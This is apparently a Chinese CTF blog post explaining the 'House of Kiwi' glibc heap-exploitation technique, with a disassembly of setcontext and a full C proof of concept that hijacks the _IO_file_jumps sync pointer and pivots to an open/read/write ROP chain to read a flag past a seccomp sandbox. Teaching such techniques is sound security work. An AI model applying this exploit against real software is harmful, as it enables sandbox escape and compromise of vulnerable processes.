---
title: house-of-Kiwi
date: 2023-11-15 13:27:21
tags:
- glibc
---

# House_of_Kiwi

在CTF的pwn题里，经常会遇到一些加了沙盒的题目，这种题目通常有下面两种

1. 劫持 `__free_hook` 为一些特定的gadget，进行栈的迁移
2. 劫持 `__malloc_hook` 为 `setcontext + 53/ setcontext + 61` 以及劫持 `IO_list_all` ,使得exit调用 `_IO_cleanup` 刷新缓冲区的时候读取flag

`setcontexnt+61` 有原本的rdi控制变成了rdx控制，需要控制rdx寄存器

**缺点**：如果把 `exit` 替换为 `_exit` ，由 `syscall` 调用，就不会走IO去刷新缓冲区，切高版本会取消对hook的使用

```assembly
<setcontext+61>:    mov    rsp,QWORD PTR [rdx+0xa0]
<setcontext+68>:    mov    rbx,QWORD PTR [rdx+0x80]
<setcontext+75>:    mov    rbp,QWORD PTR [rdx+0x78]
<setcontext+79>:    mov    r12,QWORD PTR [rdx+0x48]
<setcontext+83>:    mov    r13,QWORD PTR [rdx+0x50]
<setcontext+87>:    mov    r14,QWORD PTR [rdx+0x58]
<setcontext+91>:    mov    r15,QWORD PTR [rdx+0x60]
<setcontext+95>:    test   DWORD PTR fs:0x48,0x2
<setcontext+107>:    je     0x7ffff7e31156 <setcontext+294>
->
<setcontext+294>:    mov    rcx,QWORD PTR [rdx+0xa8]
<setcontext+301>:    push   rcx
<setcontext+302>:    mov    rsi,QWORD PTR [rdx+0x70]
<setcontext+306>:    mov    rdi,QWORD PTR [rdx+0x68]
<setcontext+310>:    mov    rcx,QWORD PTR [rdx+0x98]
<setcontext+317>:    mov    r8,QWORD PTR [rdx+0x28]
<setcontext+321>:    mov    r9,QWORD PTR [rdx+0x30]
<setcontext+325>:    mov    rdx,QWORD PTR [rdx+0x88]
<setcontext+332>:    xor    eax,eax
<setcontext+334>:    ret
```



## 利用条件：

1. 能够触发 `__malloc_assert ` 
2. 能够实现任意地址写

```cpp
static void
__malloc_assert (const char *assertion, const char *file, unsigned int line,
       const char *function)
{
(void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
           __progname, __progname[0] ? ": " : "",
           file, line,
           function ? function : "", function ? ": " : "",
           assertion);
fflush (stderr);
abort ();
}
```

在上面的函数中调用了 `fllush` ，这是个走io的函数，他最终会调用 `_IO_file_jumps` 中的 `sync` 指针

通过调试发现,`fllush` 调用了 `_IO_file_jumps` 中的 `_IO_file_sync` 并且观察发现此时 **RDX** 的值为 `_IO_helper_jumps` 指针，并且始终为一个固定的地址

## 利用方法

根据上面所述，我们只需要修改 `__IO_file_jumps` 中的 `__IO_file_sync` 为`setcontext + 0x61` ,修改 `_IO_helpers_jumps + 0xA0` 为布置好的ROP的地址， `_IO_helper_jumps + 0xA8`  为ret的地址

## POC

```c
// Ubuntu 20.04, GLIBC 2.32_Ubuntu2.2
//gcc demo.c -o main -z noexecstack -fstack-protector-all -pie -z now -masm=intel
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#define pop_rdi_ret libc_base + 0x000000000002858F
#define pop_rdx_r12 libc_base + 0x0000000000114161
#define pop_rsi_ret libc_base + 0x000000000002AC3F
#define pop_rax_ret libc_base + 0x0000000000045580
#define syscall_ret libc_base + 0x00000000000611EA
#define ret pop_rdi_ret+1
size_t libc_base;
size_t ROP[0x30];
char FLAG[0x100] = "./flag.txt\x00";
void sandbox()
{
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    struct sock_filter sfi[] ={
        {0x20,0x00,0x00,0x00000004},
        {0x15,0x00,0x05,0xC000003E},
        {0x20,0x00,0x00,0x00000000},
        {0x35,0x00,0x01,0x40000000},
        {0x15,0x00,0x02,0xFFFFFFFF},
        {0x15,0x01,0x00,0x0000003B},
        {0x06,0x00,0x00,0x7FFF0000},
        {0x06,0x00,0x00,0x00000000}
    };
    struct sock_fprog sfp = {8, sfi};
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &sfp);
}

void setROP()
{
    uint32_t i = 0;
    ROP[i++] = pop_rax_ret;
    ROP[i++] = 2;
    ROP[i++] = pop_rdi_ret;
    ROP[i++] = (size_t)FLAG;
    ROP[i++] = pop_rsi_ret;
    ROP[i++] = 0;
    ROP[i++] = syscall_ret;
    ROP[i++] = pop_rdi_ret;
    ROP[i++] = 3;
    ROP[i++] = pop_rdx_r12;
    ROP[i++] = 0x100;
    ROP[i++] = 0;
    ROP[i++] = pop_rsi_ret;
    ROP[i++] = (size_t)(FLAG + 0x10);
    ROP[i++] = (size_t)read;
    ROP[i++] = pop_rdi_ret;
    ROP[i++] = 1;
    ROP[i++] = (size_t)write;
}
int main() {
    setvbuf(stdin,0LL,2,0LL);
    setvbuf(stdout,0LL,2,0LL);
    setvbuf(stderr,0LL,2,0LL);
    sandbox();
    libc_base  = ((size_t)setvbuf) - 0x81630;
    printf("LIBC:\t%#lx\n",libc_base);

    size_t magic_gadget = libc_base + 0x53030 + 61; // setcontext + 61
    size_t IO_helper = libc_base + 0x1E48C0; // _IO_helper_jumps;
    size_t SYNC = libc_base + 0x1E5520; // sync pointer in _IO_file_jumps
    setROP();
    *((size_t*)IO_helper + 0xA0/8) = ROP; // 设置rsp
    *((size_t*)IO_helper + 0xA8/8) = ret; // 设置rcx 即 程序setcontext运行完后会首先调用的指令地址
    *((size_t*)SYNC) = magic_gadget; // 设置fflush(stderr)中调用的指令地址
    // 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert
    size_t *top_size = (size_t*)((char*)malloc(0x10) + 0x18);
    *top_size = (*top_size)&0xFFE; // top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在
    malloc(0x1000); // 触发assert
    _exit(-1);
}
```

